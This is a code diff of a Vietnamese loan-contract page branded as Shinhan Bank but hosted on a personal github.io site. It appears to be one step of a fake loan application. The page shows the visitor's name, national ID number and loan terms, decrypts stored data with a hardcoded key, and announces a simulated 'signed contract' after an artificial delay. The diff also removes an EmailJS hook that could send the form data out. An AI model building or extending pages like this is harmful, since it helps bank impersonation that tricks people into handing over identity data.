@@ -1,3 +1,34 @@
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script>
+    // Check user data from localStorage before rendering
+    (function() {
+        try {
+            const storedData = localStorage.getItem('userData');
+            if (!storedData) {
+                console.error('No userData found in localStorage');
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+                return;
+            }
+            const data = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+            console.log('Loaded userData:', data);
+
+            // Validate required fields
+            const requiredFields = ['fullName', 'cccd', 'loanAmount', 'loanTerm', 'interestRate', 'disbursementDate', 'monthlyPayment', 'totalInterest', 'totalRepay'];
+            const missingFields = requiredFields.filter(field => 
+                !data[field] || data[field] === '' || (typeof data[field] === 'number' && data[field] <= 0)
+            );
+            if (missingFields.length > 0) {
+                console.error('Missing or invalid fields:', missingFields);
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+                return;
+            }
+        } catch (error) {
+            console.error('Error loading userData:', error);
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+            return;
+        }
+    })();
+</script>
 <!DOCTYPE html>
 <html lang="vi">
 <head>
@@ -275,7 +306,7 @@
                 <h3>XÉT DUYỆT THÀNH CÔNG</h3>
                 <div class="success-message" aria-live="polite">
                     <h4>CHÚC MỪNG BẠN!!</h4>
-                    <p>Khoản vay của bạn đả sẵn sàng. Vui lòng kiểm tra hợp đồng vay và bảng điều kiện giảy ngân để nhận tiền ✓:</p>
+                    <p>Khoản vay của bạn đã sẵn sàng. Vui lòng kiểm tra hợp đồng vay và bảng điều kiện giải ngân để nhận tiền ✓:</p>
                 </div>
                 <table class="table table-bordered contract-table">
                     <tbody id="contractDetails">
@@ -289,10 +320,6 @@
                     </label>
                     <p id="contractConsentError" class="error"></p>
                 </div>
-                <div class="mt-3">
-                    <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html" class="btn btn-primary">HỢP ĐỒNG VAY</a>
-                    <button class="btn btn-primary" onclick="printInfo()">TẢI XUỐNG</button>
-                </div>
             </div>
 
             <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
@@ -300,7 +327,7 @@
                     <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html" class="btn btn-outline-secondary">QUAY LẠI</a>
                 </div>
                 <button class="btn btn-primary position-relative" onclick="signContract()">
-                    TIẾP TỤC
+                    XÁC NHẬN
                     <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                 </button>
             </div>
@@ -331,41 +358,12 @@
     </a>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
-        // Initialize EmailJS
-        try {
-            emailjs.init("OrBsI926QI2_xBh1f");
-            console.log('EmailJS initialized successfully');
-        } catch (error) {
-            console.error('EmailJS initialization failed:', error);
-        }
-
-        // Load user data from localStorage
+        // Load user data from localStorage (already checked above)
         function loadUserData() {
-            try {
-                const storedData = localStorage.getItem('userData');
-                if (storedData) {
-                    const data = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData:', data);
-                    // Check required fields
-                    const requiredFields = ['loanAmount', 'loanTerm', 'interestRate', 'disbursementDate', 'monthlyPayment', 'totalInterest', 'totalRepayment'];
-                    const missingFields = requiredFields.filter(field => !data[field] || data[field] === "N/A" || data[field] === 0);
-                    if (missingFields.length > 0) {
-                        console.warn('Missing or invalid fields:', missingFields);
-                        alert('Dữ liệu hồ sơ không đầy đủ: ' + missingFields.join(', ') + '. Vui lòng quay lại bước đăng ký.');
-                    }
-                    return data;
-                } else {
-                    console.error('No userData found in localStorage');
-                    alert('Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.');
-                    return {};
-                }
-            } catch (error) {
-                console.error('Error loading userData:', error);
-                alert('Lỗi tải dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.');
-                return {};
-            }
+            const storedData = localStorage.getItem('userData');
+            const data = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+            return data;
         }
 
         // Save user data to localStorage
@@ -374,74 +372,71 @@
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
                 console.log('Saved userData:', data);
+                return true;
             } catch (error) {
                 console.error('Error saving userData:', error);
+                return false;
             }
         }
 
-        // Check for existing registration and load contract details
+        // Load contract details
         window.onload = function() {
             let savedData = loadUserData();
 
-            // Add default values for missing fields before processing
-            if (!savedData.disbursementDate || savedData.disbursementDate === "N/A" || savedData.disbursementDate === "") {
-                savedData.disbursementDate = new Date().toISOString().split('T')[0]; // Today
-            }
-            if (!savedData.loanTerm || savedData.loanTerm === "N/A" || savedData.loanTerm === 0) {
-                savedData.loanTerm = 12; // Example: 12 months
-            }
-            if (!savedData.totalInterest || savedData.totalInterest === "N/A" || savedData.totalInterest === 0) {
-                savedData.totalInterest = savedData.monthlyPayment ? Math.round(savedData.monthlyPayment * savedData.loanTerm * 0.1) : 5000000; // Estimate based on monthlyPayment or default
-            }
-            if (!savedData.totalRepayment || savedData.totalRepayment === "N/A" || savedData.totalRepayment === 0) {
-                savedData.totalRepayment = (savedData.loanAmount ? Number(savedData.loanAmount) : 50000000) + savedData.totalInterest; // loanAmount + totalInterest
-            }
-
-            // Save updated data before processing
-            saveToLocalStorage(savedData);
-
-            // Replace "N/A" or 0 with "" for all fields
-            for (let key in savedData) {
-                if (savedData[key] === "N/A" || savedData[key] === 0) {
-                    savedData[key] = "";
-                }
-            }
+            // Map fields from Step 1
+            savedData.customerName = savedData.fullName;
+            savedData.idNumber = savedData.cccd;
+            savedData.loanAmount = Number(savedData.loanAmount);
+            savedData.loanTerm = Number(savedData.loanTerm);
+            savedData.interestRate = Number(savedData.interestRate);
+            savedData.disbursementDate = savedData.disbursementDate;
+            savedData.monthlyPayment = Number(savedData.monthlyPayment);
+            savedData.totalInterest = Number(savedData.totalInterest);
+            savedData.totalRepayment = Number(savedData.totalRepay);
 
             // Calculate due date
             let dueDate = "";
-            if (savedData.disbursementDate && savedData.loanTerm) {
-                const disbursementDate = new Date(savedData.disbursementDate);
-                const loanTermMonths = parseInt(savedData.loanTerm);
-                if (!isNaN(disbursementDate.getTime()) && loanTermMonths > 0) {
-                    disbursementDate.setMonth(disbursementDate.getMonth() + loanTermMonths);
-                    dueDate = disbursementDate.toISOString().split('T')[0];
-                }
+            const disbursementDate = new Date(savedData.disbursementDate);
+            const loanTermMonths = parseInt(savedData.loanTerm);
+            if (!isNaN(disbursementDate.getTime()) && loanTermMonths > 0) {
+                disbursementDate.setMonth(disbursementDate.getMonth() + loanTermMonths);
+                dueDate = disbursementDate.toISOString().split('T')[0];
+            } else {
+                console.error('Invalid disbursement date or loan term');
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+                return;
             }
 
+            // Display contract details
             const details = [
-                { label: 'Số tiền vay', value: savedData.loanAmount ? Math.floor(Number(savedData.loanAmount)).toLocaleString('vi-VN') + ' VND' : "" },
-                { label: 'Thời hạn vay', value: savedData.loanTerm ? savedData.loanTerm + ' tháng' : "" },
-                { label: 'Lãi suất', value: savedData.interestRate ? Math.floor(Number(savedData.interestRate)) + '%/năm' : "" },
-                { label: 'Ngày giải ngân', value: savedData.disbursementDate || "" },
+                { label: 'Tên khách hàng', value: savedData.customerName },
+                { label: 'Số CMND/CCCD', value: savedData.idNumber },
+                { label: 'Số tiền vay', value: Math.floor(savedData.loanAmount).toLocaleString('vi-VN') + ' VND' },
+                { label: 'Thời hạn vay', value: savedData.loanTerm + ' tháng' },
+                { label: 'Lãi suất', value: Math.floor(savedData.interestRate) + '%/năm' },
+                { label: 'Ngày giải ngân', value: savedData.disbursementDate },
                 { label: 'Ngày đáo hạn', value: dueDate },
-                { label: 'Số tiền trả hàng tháng', value: savedData.monthlyPayment ? Math.floor(Number(savedData.monthlyPayment)).toLocaleString('vi-VN') + ' VND' : "" },
-                { label: 'Tổng lãi phải trả', value: savedData.totalInterest ? Math.floor(Number(savedData.totalInterest)).toLocaleString('vi-VN') + ' VND' : "" },
-                { label: 'Tổng tiền phải trả', value: savedData.totalRepayment ? Math.floor(Number(savedData.totalRepayment)).toLocaleString('vi-VN') + ' VND' : "" }
+                { label: 'Số tiền trả hàng tháng', value: Math.floor(savedData.monthlyPayment).toLocaleString('vi-VN') + ' VND' },
+                { label: 'Tổng lãi phải trả', value: Math.floor(savedData.totalInterest).toLocaleString('vi-VN') + ' VND' },
+                { label: 'Tổng tiền phải trả', value: Math.floor(savedData.totalRepayment).toLocaleString('vi-VN') + ' VND' }
             ];
 
             const tableBody = document.getElementById('contractDetails');
+            tableBody.innerHTML = ''; // Clear previous content
             details.forEach(detail => {
-                tableBody.innerHTML += `<tr><th>${detail.label}</th><td>${detail.value || 'Chưa có dữ liệu'}</td></tr>`;
+                tableBody.innerHTML += `<tr><th>${detail.label}</th><td style="font-weight: bold;">${detail.value}</td></tr>`;
             });
+
+            // Add progress text
+            const progress = document.createElement('div');
+            progress.className = 'progress-percentage';
+            progress.textContent = 'Hoàn tất: 100%';
+            document.querySelector('.step-indicator').after(progress);
 
             // Save approval status
             savedData.currentStep = 5;
             saveToLocalStorage(savedData);
         };
-
-        function printInfo() {
-            window.print();
-        }
 
         function signContract() {
             const consent = document.getElementById('contractConsent').checked;
@@ -455,7 +450,7 @@
                 formCheck.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 setTimeout(() => {
                     formCheck.classList.remove('error-highlight');
-                }, 2000); // Remove highlight after 2 seconds
+                }, 2000);
                 return;
             }
 
@@ -463,8 +458,9 @@
             spinner.style.display = 'inline-block';
             setTimeout(() => {
                 spinner.style.display = 'none';
+                alert('Hợp đồng đã được ký thành công!');
                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html';
-            }, 1000); // Giả lập thời gian chờ 1 giây
+            }, 1000);
         }
     </script>
 </body>
